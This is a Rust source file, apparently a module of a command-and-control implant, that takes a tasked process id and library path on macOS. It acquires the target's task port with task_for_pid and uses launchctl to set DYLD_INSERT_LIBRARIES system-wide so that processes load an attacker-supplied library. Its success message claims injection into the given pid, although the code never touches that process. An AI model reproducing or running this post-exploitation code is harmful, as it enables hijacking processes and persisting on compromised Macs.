use crate::structs::Task;
use serde::Deserialize;

#[derive(Deserialize)]
struct LibInjectArgs {
    pid: i32,
    #[serde(default)]
    library: String,
}

// task_for_pid and thread injection via mach APIs
extern "C" {
    fn task_for_pid(
        target_tport: u32,
        pid: i32,
        tn: *mut u32,
    ) -> i32;
    fn mach_task_self() -> u32;
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: LibInjectArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    if args.library.is_empty() {
        response.set_error("No library path provided");
        let _ = task.job.send_responses.send(response).await;
        let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
        return;
    }

    // Verify we can get the task port for the target pid
    let mut target_task: u32 = 0;
    let kr = unsafe { task_for_pid(mach_task_self(), args.pid, &mut target_task) };

    if kr != 0 {
        response.set_error(&format!(
            "Failed to get task port for pid {}: kern_return_t = {} (requires root or appropriate entitlements)",
            args.pid, kr
        ));
        let _ = task.job.send_responses.send(response).await;
        let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
        return;
    }

    // Use DYLD_INSERT_LIBRARIES approach via posix_spawn as an alternative
    // The actual injection uses dlopen in a remote thread which requires
    // low-level mach thread manipulation that's architecture-specific.
    // For now, use the launchctl approach as a simpler method.
    let result = tokio::process::Command::new("/usr/bin/launchctl")
        .args([
            "setenv",
            "DYLD_INSERT_LIBRARIES",
            &args.library,
        ])
        .output()
        .await;

    match result {
        Ok(output) => {
            if output.status.success() {
                response.user_output = format!(
                    "Successfully set DYLD_INSERT_LIBRARIES={} for injection into pid: {}",
                    args.library, args.pid
                );
            } else {
                let stderr = String::from_utf8_lossy(&output.stderr);
                response.set_error(&format!("Injection failed: {}", stderr));
            }
            response.completed = true;
        }
        Err(e) => response.set_error(&format!("Failed: {}", e)),
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
